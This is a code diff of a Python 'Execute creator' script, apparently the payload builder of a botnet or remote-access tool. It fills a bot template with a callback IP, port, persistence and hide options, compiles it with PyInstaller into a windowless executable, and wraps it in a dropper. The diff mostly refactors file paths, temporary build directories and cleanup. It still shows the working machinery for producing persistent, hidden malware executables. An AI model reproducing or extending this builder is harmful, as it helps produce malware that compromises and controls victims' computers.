@@ -2,19 +2,20 @@
 # Author: Pure-L0G1C
 # Description: Execute creator
 
-from os import remove
-from os.path import sep
+import os  
+import sys 
+import shlex 
+import shutil
+import smtplib 
+import tempfile
 from lib.file import File
 from lib.args import Args
-from subprocess import Popen
 
-# pyinstaller
 try:
-    from PyInstaller import is_win
+    from PyInstaller import __main__ as pyi, is_win
 except:
-    from sys import exit
-    print('Please install Pyinstaller')
-    exit(-1)
+    print('Please install Pyinstaller: pip install pyinstaller')
+    sys.exit(1)
 
 class Executor(object):
 
@@ -29,13 +30,20 @@ class Executor(object):
         self.delay = delay
         self.persist = persist
         self.filename = filename
-        self.bot_template = 'bot' + sep + 'template_bot.py'
-        self.bot_py_temp = 'bot' + sep + '{}.py'.format(filename)
-        self.bot_compiled = 'dist' + sep + '{}.exe'.format(filename)
 
-        self.dropper_compiled = self.bot_compiled
-        self.dropper_template = 'lib' + sep + 'dropper.py'
-        self.dropper_py_temp = 'lib' + sep + '{}.py'.format(filename)
+        self.output_dir = 'output'
+        self.tmp_dir = tempfile.mkdtemp()
+        self.dist_path = os.path.join(self.tmp_dir, 'application')
+
+        self.output_dir = 'output'
+        self.dist_path = os.path.join(self.tmp_dir, 'application')
+
+        self.bot_template = 'bot' + os.path.sep + 'template_bot.py'
+        self.bot_py_temp = 'bot' + os.path.sep + '{}.py'.format(filename)
+        self.bot_compiled = self.dist_path + os.path.sep + '{}.exe'.format(filename)
+
+        self.dropper_template = 'lib' + os.path.sep + 'dropper.py'
+        self.dropper_py_temp = '{}.py'.format(filename)
 
     def replace(self, data, _dict):
         for k in _dict:
@@ -43,8 +51,13 @@ class Executor(object):
         return data
 
     def compile_file(self, path):
-        cmd = 'pyinstaller -F -w {} {}'.format('' if not self.icon else '-i {}'.format(self.icon), path)
-        Popen(cmd.split()).wait()
+        path = os.path.abspath(path)
+
+        build_path = os.path.join(self.tmp_dir, 'build')
+        cmd = 'pyinstaller -y -F -w {}'.format(shlex.quote(path))
+
+        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + ['--workpath', build_path] + ['--specpath', self.tmp_dir]
+        pyi.run()
 
     def write_template(self, template, py_temp, _dict):
         data = ''
@@ -65,8 +78,8 @@ class Executor(object):
 
         self.write_template(self.bot_template, self.bot_py_temp, _dict)
         if self.exe:
-            for data in File.read(self.bot_compiled):
-                self.binary += data
+            with open(self.bot_compiled, 'rb') as f:
+                self.binary = f.read()
 
     def compile_dropper(self):
         _dict = {
@@ -78,17 +91,29 @@ class Executor(object):
 
         self.write_template(self.dropper_template, self.dropper_py_temp, _dict)
 
+    def move_file(self, file):
+        if not os.path.exists(self.output_dir):
+            os.mkdir(self.output_dir)
+        else:
+            _path = os.path.join(self.output_dir, file)
+            if os.path.exists(_path):
+                os.remove(_path)
+
+        path = os.path.join(self.dist_path, file)
+        shutil.move(path, self.output_dir)
+
     def start(self):
         self.compile_bot()
         if self.exe:
             self.compile_dropper()
-            self.clean_up()
+            file = os.listdir(self.dist_path)[0]
+            self.move_file(file)
+            self.clean_up() 
 
     def clean_up(self):
-        spec_file = '{}.spec'.format(self.filename)
-        remove(self.dropper_py_temp)
-        remove(self.bot_py_temp)
-        remove(spec_file)
+        shutil.rmtree(self.tmp_dir)
+        os.remove(self.bot_py_temp)
+        os.remove(self.dropper_py_temp)
 
 if __name__ == '__main__':
     args = Args()
@@ -96,6 +121,6 @@ if __name__ == '__main__':
         executor = Executor(args.ip, args.port, args.name, args.delay, args.wait, args.type, args.icon, args.hide, args.persist)
 
         executor.start()
-        Popen('cls' if is_win else 'clear', shell=True).wait()
+        os.system('cls' if is_win else 'clear')
         print('\nFinished creating {}'.format(executor.filename + '.exe' if executor.exe else executor.bot_py_temp))
-        print('Look in the directory named dist for your exe file' if executor.exe else 'Look in the directory named bot for your Python file')
+        print('Look in the directory named output for your exe file' if executor.exe else 'Look in the directory named bot for your Python file')
